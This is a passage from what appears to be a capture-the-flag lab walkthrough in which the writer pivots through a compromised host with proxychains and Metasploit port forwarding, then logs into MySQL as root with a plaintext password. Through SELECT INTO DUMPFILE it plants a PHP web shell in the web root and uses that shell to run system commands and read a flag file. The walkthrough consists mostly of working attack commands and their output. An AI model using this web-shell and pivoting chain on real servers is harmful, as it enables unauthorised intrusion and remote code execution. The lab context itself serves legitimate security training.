Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-11 16:47 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.33 seconds
```

`proxychains nmap -sS -sV 192.180.99.3 -p80,3306 -Pn`: [✗]
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-11 16:47 IST
Nmap scan report for 192-180-099-003.res.spectrum.com (192.180.99.3)
Host is up.

PORT     STATE    SERVICE VERSION
80/tcp   filtered http
3306/tcp filtered mysql

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

`proxychains nmap -sT -sV 192.180.99.3 -p80,3306 -Pn --open`: [✓]
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-11 16:48 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.180.99.3:3306  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.180.99.3:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.180.99.3:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.180.99.3:3306  ...  OK

...

Nmap scan report for 192-180-099-003.res.spectrum.com (192.180.99.3)
Host is up (0.0034s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu)) ←
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1 ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
```

**Step 11**.

`sessions -i 2`, `portfwd add -l 4321 -p 80 -r 192.180.99.3`: [✓]
```
[*] Local TCP relay created: :4321 <-> 192.180.99.3:80 ←
```

`portfwd list`: [✓]
```
Active Port Forwards
====================

   Index  Local            Remote        Direction
   -----  -----            ------        ---------
   1      192.180.99.3:80  0.0.0.0:4321  Forward ←

1 total active port forwards.
```

`bg`, `nmap -sS -sV localhost -p4321`: [✓]
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-11 16:57 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000039s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
4321/tcp open  http    Apache httpd 2.4.7 ((Ubuntu)) ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds
```

`curl localhost:4321`: [✓]
```
[*] exec: curl localhost:4321

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<HTML>
   <HEAD>
      <title>INE Infosec Trainings!</title>
   </HEAD>
   <BODY>
      <P>Website is under development. Stay Tuned!
      <P>You can upload files to /webtemp ←
   </BODY>
</HTML>
```

But, what if we can access the `/webtemp` directory directly from the browser. Let's try to access it.

`firefox localhost:4321/webtemp &`. [✓]
We can access the `/webtemp` directory without any issues.

**Step 12**.

`mysql -h 192.180.99.3 -u root -pfArFLP29UySm4bZj`: [✓]
```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 49
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Now, we can leverage the MySQL database access to dump the file into `/var/www/html/webtemp` folder using `DUMPFILE` syntax.

`SELECT ... INTO DUMPFILE <file_path>` is a SELECT clause which writes the resultset into a single unformatted row, without any separators, in a file. The results will not be returned to the client.
`<file_path>` can be an absolute path, or a relative path starting from the data directory. It can only be specified as a string literal, not as a variable. However, the statement can be dynamically composed and executed as a prepared statement to work around this limitation.
This statement is binary-safe and so is particularly useful for writing BLOB values to file. It can be used, for example, to copy an image or an audio document from the database to a file.
`SELECT ... INTO FILE <file_path>` can be used to save a text file. The file must not exist. It cannot be overwritten. A user needs the `FILE` privilege to run this statement. Also, MariaDB needs permission to write files in the specified location. If the `secure_file_priv` system variable is set to a non-empty directory name, the file can only be written to that directory.

By default, the latest version of the apache web server root directory is `/var/www/html`.
The root directory depends on the Apache webserver version. For older versions, it would be `/var/www/`).

We will dump a PHP backdoor into a file (`backdoor.php`), to the web server's root directory.

`SELECT '<?php echo system($_GET["cmd"]); ?>' into DUMPFILE '/var/www/html/webtemp/backdoor.php';`: [✓]
```
Query OK, 1 row affected (0.00 sec)
```

`curl localhost:4321/webtemp/backdoor.php?cmd=pwd` [✓]
```
[*] exec: curl localhost:4321/webtemp/backdoor.php?cmd=pwd

/var/www/html/webtemp ←
```

`curl localhost:4321/webtemp/backdoor.php?cmd=whoami`: [✓]
```
[*] exec: curl localhost:4321/webtemp/backdoor.php?cmd=whoami

www-data ←
```

`curl localhost:4321/webtemp/backdoor.php?cmd=ip+addr`: [✓]
```
[*] exec: curl localhost:4321/webtemp/backdoor.php?cmd=ip+addr

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ip_vti0@NONE: <NOARP> mtu 1480 qdisc noop state DOWN group default qlen 1000
    link/ipip 0.0.0.0 brd 0.0.0.0
324848: eth0@if324849: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c0:b4:63:03 brd ff:ff:ff:ff:ff:ff
    inet 192.180.99.3/24 brd 192.180.99.255 scope global eth0 ←
       valid_lft forever preferred_lft forever
```

`curl localhost:4321/webtemp/backdoor.php?cmd=ls%20../`: [✓]
```
[*] exec: curl localhost:4321/webtemp/backdoor.php?cmd=ls%20../

FLAG2 ←
index.html
webtemp
```

`curl localhost:4321/webtemp/backdoor.php?cmd=cat%20../FLAG2`: [✓]
```
[*] exec: curl localhost:4321/webtemp/backdoor.php?cmd=cat%20../FLAG2

4c537c0dfd18bafdcd59f53c7015550e ←
```

---
---
